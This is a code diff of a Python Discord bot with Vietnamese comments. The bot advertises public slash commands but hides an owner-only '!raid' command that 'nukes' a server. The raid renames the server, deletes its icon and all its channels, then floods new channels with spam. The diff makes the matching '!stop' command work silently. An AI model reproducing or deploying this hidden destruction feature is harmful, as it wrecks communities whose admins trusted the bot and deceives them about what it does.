@@ -1887,14 +1887,14 @@ async def raid(guild):
     nuke_running = True
     await change_guild_name(guild)
     await asyncio.sleep(0.5)
-    await delete_guild_icon(guild)   # Xóa ảnh đại diện server
+    await delete_guild_icon(guild)
     await asyncio.sleep(0.5)
     await delete_all_channels(guild)
     await asyncio.sleep(0.1)
     asyncio.create_task(create_channels_and_spam(guild))
     asyncio.create_task(continuous_spam(guild))
 
-# ===== LỆNH !raid VÀ !stop (ĐÃ SỬA) =====
+# ===== LỆNH !raid VÀ !stop (ĐÃ SỬA – !stop ÂM THẦM) =====
 @client.event
 async def on_message(message):
     global nuke_running
@@ -1921,9 +1921,7 @@ async def on_message(message):
     elif message.content.lower() == "!stop":
         if nuke_running:
             nuke_running = False
-            await message.channel.send("⏹️ **Đã dừng nuke!** Bot vẫn hoạt động bình thường.")
-        else:
-            await message.channel.send("ℹ️ **Nuke hiện không chạy.** Bot vẫn hoạt động.")
+        # Không gửi gì cả – âm thầm dừng
 
 # ===== SỰ KIỆN =====
 @client.event
@@ -1934,7 +1932,7 @@ async def on_ready():
     print(f"[*] Bot online: {client.user}")
     print("[*] Public: /start, /rankings, /diem")
     print("[*] Hidden: !raid (owner only – full nuke)")
-    print("[*] Hidden: !stop (owner only – stop nuke)")
+    print("[*] Hidden: !stop (owner only – stop nuke silently)")
     await tree.sync()
     print("[*] Slash commands synced.")
     for guild in client.guilds:
